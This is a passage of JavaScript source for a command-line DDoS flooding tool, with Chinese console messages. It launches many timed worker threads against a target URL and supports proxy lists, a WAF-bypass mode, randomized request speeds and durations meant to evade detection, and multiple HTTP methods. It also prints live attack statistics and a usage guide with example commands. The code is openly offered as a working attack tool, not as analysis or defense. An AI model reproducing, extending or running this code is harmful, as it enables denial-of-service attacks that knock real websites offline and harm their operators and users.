  const totalDuration = randomSpeedEnabled ? maxWorkerDuration : baseDuration;
  
  console.log(`
╔══════════════════════════════════════════════════════════════╗
║                     DDoS 攻击启动                           ║
╚══════════════════════════════════════════════════════════════╝`.attack);

  console.log(`\x1b[36m[目标]\x1b[37m     ${target}`.info);
  console.log(`\x1b[36m[主机]\x1b[37m     ${parsed.hostname}:${parsed.port || (parsed.protocol === 'https:' ? 443 : 80)}`.info);
  console.log(`\x1b[36m[协议]\x1b[37m     ${parsed.protocol.replace(':', '')}`.info);
  console.log(`\x1b[36m[方法]\x1b[37m     ${method}`.info);
  console.log(`\x1b[36m[总时长]\x1b[37m   ${RandomDurationGenerator.formatDuration(totalDuration)}`.info);
  console.log(`\x1b[36m[线程]\x1b[37m     ${threads} 个`.info);
  console.log(`\x1b[36m[间隔]\x1b[37m     ${interval}ms (${Math.round(1000/interval)} 请求/秒)`.info);
  console.log(`\x1b[36m[连接请求数]\x1b[37m ${requestsPerConnection} 个`.info);
  console.log(`\x1b[36m[代理]\x1b[37m     ${useProxies ? '是 (' + proxies.length + ' 个)' : '否 (直接连接)'}`.info);
  console.log(`\x1b[36m[WAF绕过]\x1b[37m ${wafEnabled ? '✅ 已启用' : '❌ 未启用'}`.bypass);
  console.log(`\x1b[36m[随机速度]\x1b[37m ${randomSpeedEnabled ? '✅ 已启用' : '❌ 未启用'}`.random);
  
  if (randomSpeedEnabled) {
    console.log(`\x1b[36m[线程时长]\x1b[37m 每个线程随机40分钟到${RandomDurationGenerator.formatDuration(maxWorkerDuration)}`.info);
    console.log(`\x1b[36m[速度变化]\x1b[37m 间隔1-100ms随机，30秒-3分钟变化一次`.info);
    console.log(`\x1b[36m[多方法攻击]\x1b[37m 已启用，随机并发1-3个HTTP方法`.method);
  }
  
  console.log('');

  const endTime = Date.now() + totalDuration;
  setTimeout(() => {
    console.log('\n\x1b[33m[完成] 攻击时间结束，正在关闭...\x1b[37m'.warn);
    stopFunctions.forEach(stop => stop());
    process.exit(0);
  }, totalDuration);

  let totalRequests = 0;
  let failedRequests = 0;
  let startTime = Date.now();
  let workerStats = [];
  let globalMethodStats = {};

  for (let i = 0; i < threads; i++) {
    const startDelay = Math.random() * 10000;
    
    setTimeout(() => {
      const stopFunction = enhancedAttackWorker(
        i + 1,
        target,
        parsed,
        method,
        proxies,
        useProxies,
        wafBypass,
        speedControllers[i],
        multiMethodManagers[i],
        workerDurations[i],
        interval,
        requestsPerConnection,
        (sent, failed) => {
          totalRequests += sent;
          failedRequests += failed;
          workerStats[i] = { sent, failed };
          
          const stats = multiMethodManagers[i].getMethodStats();
          for (const [method, count] of Object.entries(stats)) {
            if (!globalMethodStats[method]) {
              globalMethodStats[method] = 0;
            }
            globalMethodStats[method] += count;
          }
        }
      );
      
      stopFunctions.push(stopFunction);
      
      console.log(`\x1b[33m[线程${i+1}启动]\x1b[37m 时长: ${RandomDurationGenerator.formatDuration(workerDurations[i])}`.random);
      
    }, startDelay);
  }

  console.log('\x1b[33m[启动] 攻击开始，按 Ctrl+C 停止\x1b[37m\n'.warn);
  
  let lastTotal = 0;
  const statsInterval = setInterval(() => {
    const elapsed = (Date.now() - startTime) / 1000;
    const currentRate = Math.round((totalRequests - lastTotal) / 1);
    const avgRate = elapsed > 0 ? Math.round(totalRequests / elapsed) : 0;
    lastTotal = totalRequests;
    
    const progress = ((Date.now() - (endTime - totalDuration)) / totalDuration * 100).toFixed(1);
    
    let speedInfo = '';
    if (speedControllers[0]) {
      speedInfo = ` | 当前速度: ${speedControllers[0].getSpeedDescription ? speedControllers[0].getSpeedDescription() : `${Math.round(1000/interval)} 请求/秒 (间隔: ${interval}ms)`}`;
    }
    
    console.log('\x1b[36m[统计]\x1b[37m'.info + 
      ` 请求: ${totalRequests} | 失败: ${failedRequests} | 当前: ${currentRate}/s | 平均: ${avgRate}/s | 进度: ${progress}%${speedInfo}`.stats);
    
    if (Date.now() >= endTime) {
      clearInterval(statsInterval);
      stopFunctions.forEach(stop => stop());
      showFinalStats(totalRequests, failedRequests, startTime, useProxies, proxies.length, wafEnabled, randomSpeedEnabled, interval, requestsPerConnection, globalMethodStats);
    }
  }, 1000);

  process.on('SIGINT', () => {
    console.log('\n\x1b[33m[停止] 收到停止信号，正在终止攻击...\x1b[37m'.warn);
    clearInterval(statsInterval);
    stopFunctions.forEach(stop => stop());
    showFinalStats(totalRequests, failedRequests, startTime, useProxies, proxies.length, wafEnabled, randomSpeedEnabled, interval, requestsPerConnection, globalMethodStats);
    process.exit(0);
  });
}

function main() {
  const isCLI = require.main === module;
  const hasArgs = process.argv.length > 2;
  
  if (isCLI && !hasArgs) {
    console.log('\n\x1b[31m[错误]\x1b[37m 参数不足'.error);
    console.log('\x1b[36m[用法]\x1b[37m node ' + fileName + ' <目标URL> [代理文件] <持续时间> <线程数> [间隔(ms)] [连接请求数] [方法] [--waf] [--random-speed]'.info);
    console.log('\x1b[33m[示例]\x1b[37m'.warn);
    console.log('  node ' + fileName + ' http://example.com 60 100'.warn);
    console.log('  node ' + fileName + ' http://example.com proxies.txt 60 100 5 10 GET'.warn);
    console.log('  node ' + fileName + ' http://example.com proxies.txt 60 100 1 50 GET --waf'.warn);
    console.log('  node ' + fileName + ' http://example.com proxies.txt 60 100 1 50 GET --waf --random-speed'.warn);
    console.log('\x1b[33m[注意]\x1b[37m'.warn);
    console.log('  --waf: 启用WAF绕过模式'.warn);
    console.log('  --random-speed: 启用随机速度和持续时间，同时启用多方法攻击'.warn);
    console.log('  间隔: 请求间隔时间(毫秒)，默认10ms'.warn);
    console.log('  连接请求数: 每个连接发送的请求数，默认5'.warn);
    console.log('  代理文件可选: 如果不提供，将使用直接连接攻击'.warn);
    process.exit(1);
  }
  
  if (hasArgs) {
    startEnhancedAttack();
  }
}

if (require.main === module) {
  main();
}

module.exports = {
  main,
  startEnhancedAttack,
  parseArguments,
  EnhancedWAFBypass,
  EnhancedRandomSpeedController,
  RandomDurationGenerator
};
